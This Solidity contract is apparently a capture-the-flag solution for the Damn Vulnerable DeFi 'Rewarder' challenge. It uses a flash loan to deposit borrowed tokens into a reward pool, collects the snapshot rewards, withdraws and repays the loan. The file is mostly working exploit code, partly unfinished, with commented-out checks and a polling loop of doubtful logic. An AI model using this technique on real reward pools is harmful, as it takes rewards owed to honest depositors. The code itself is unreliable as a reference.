// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
// import "./AccountingToken.sol";

/**
 * @title AttackRewarder
 * @author sidarth16
 */

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

// abstract contract MyRewarderPool{
//     uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
//     uint256 public lastRecordedSnapshotTimestamp;
//     function deposit(uint256 amountToDeposit)virtual  external;
//     function withdraw(uint256 amountToWithdraw) virtual external;
//     function isNewRewardsRound() virtual external view returns (bool);
//     function distributeRewards() virtual external returns (uint256);
// }

contract AttackRewarder {

    using Address for address;

    TheRewarderPool public rewarderPool;
    IERC20 rewardToken ;
    IERC20 liquidityToken ;
    address flashLoanPool ;
    address rewarderPoolAdd;
    uint256 targetSnapshotTimeStamp;

     // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    constructor (
        address _rewardPool, 
        address _flashLoanPool,
        address _liquidityTokenAddress
    ) {
        rewarderPool = TheRewarderPool(_rewardPool);
        flashLoanPool = _flashLoanPool;
        liquidityToken = IERC20(_liquidityTokenAddress);
        rewardToken = IERC20(rewarderPool.rewardToken());

        rewarderPoolAdd = _rewardPool;
    }

    function attack(uint256 amt, address attacker) external
    {   
        console.log("Attack called for : ",amt);
        liquidityToken.approve(rewarderPoolAdd, amt);
        targetSnapshotTimeStamp = rewarderPool.lastRecordedSnapshotTimestamp();

        // require( 
        //     (rewarderPool.lastRecordedSnapshotTimestamp() + REWARDS_ROUND_MIN_DURATION) - block.timestamp  > 2 ,
        //     "Attack called too late"
        // );
        // require( 
        //     (rewarderPool.lastRecordedSnapshotTimestamp() + REWARDS_ROUND_MIN_DURATION) - block.timestamp  < 20 ,
        //     "Attack called too early"
        // );
        
        IFlashLoanerPool(flashLoanPool).flashLoan(amt);
        
        uint256 rewards_balance = rewardToken.balanceOf(attacker);
        rewardToken.transfer(attacker , rewards_balance );
    }

    function receiveFlashLoan(uint256 amt) external {
        console.log("Received Flash loan : ",amt);
        require(rewarderPool.lastRecordedSnapshotTimestamp() == targetSnapshotTimeStamp ) ;
        console.log("Initial Depositing : ",amt);
        rewarderPool.deposit(amt);
        console.log("");
        uint256 extraTokensSpent = 0 ;
        while(true){
            if (rewarderPool.lastRecordedSnapshotTimestamp() != targetSnapshotTimeStamp){
                console.log("--finally--");
                break;
            }
            console.log(rewarderPool.lastRecordedSnapshotTimestamp() );
            // console.log("Depositing : ",1);
            // rewarderPool.deposit(1);
            // extraTokensSpent+=1;
            // continue;
        }

        // console.log("");
        // console.log("------------Final Depositing : ",1);
        // rewarderPool.deposit(1);
        // extraTokensSpent+=1;

        rewarderPool.withdraw(amt + extraTokensSpent);   

        console.log("Balance after withdraw : ",liquidityToken.balanceOf(address(this)));  
        liquidityToken.transfer(flashLoanPool, amt);

    }

}
